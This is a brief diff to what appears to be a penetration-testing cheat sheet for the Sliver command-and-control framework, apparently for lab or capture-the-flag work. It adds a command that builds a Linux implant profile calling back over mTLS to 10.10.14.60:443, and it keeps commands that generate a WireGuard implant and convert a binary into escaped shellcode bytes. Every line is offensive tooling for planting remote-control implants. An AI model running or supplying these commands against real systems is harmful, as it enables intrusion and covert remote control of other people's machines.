@@ -1,5 +1,8 @@
 % sliver
 
+# generate profile
+profiles new --mtls 10.10.14.60:443 --skip-symbols --format exe --arch amd64 --os linux lin64mtls_exe
+
 # generate wireguard implant
 generate --wg <tun0> --format exe
 xxd -p <FILE> | sed 's/\(..\)/\\x\1/g' | tr -d '\n'
